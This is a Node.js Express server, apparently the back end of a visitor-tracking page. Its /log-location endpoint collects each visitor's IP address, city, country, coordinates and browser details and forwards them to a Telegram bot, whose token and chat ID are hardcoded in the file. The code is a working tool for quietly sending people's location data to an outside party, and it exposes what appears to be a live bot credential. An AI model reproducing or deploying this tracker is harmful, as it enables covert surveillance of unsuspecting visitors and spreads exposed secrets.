const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

const axios = require('axios');

const TELEGRAM_TOKEN = '7567380208:AAECSW72_wgRbICOObbkAG_OdbFQSP2YaZU';
const CHAT_ID = '912804361';

function enviarATelegram(mensaje) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    return axios.post(url, {
        chat_id: CHAT_ID,
        text: mensaje
    });
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'))); // Servir archivos estáticos desde /public

app.post('/log-location', (req, res) => {
    const logEntry = `${new Date().toISOString()} - ${JSON.stringify(req.body)}\n`;
    console.log(logEntry);

    const { ip, city, region, country, lat, lon, userAgent } = req.body;

    const mensaje = `
🌐 NUEVO INGRESO A LA PÁGINA
📍 IP: ${ip || 'No disponible'}
🌆 Ciudad: ${city || 'Desconocida'}, ${region || ''}, ${country || ''}
🖥️ Navegador: ${userAgent || 'Desconocido'}
🕒 Hora: ${new Date().toLocaleString()}
    `;

    enviarATelegram(mensaje).catch(err => console.error('Error al enviar a Telegram:', err));

    res.sendStatus(200);
});


app.listen(PORT, () => console.log(`Servidor corriendo en el puerto ${PORT}`));
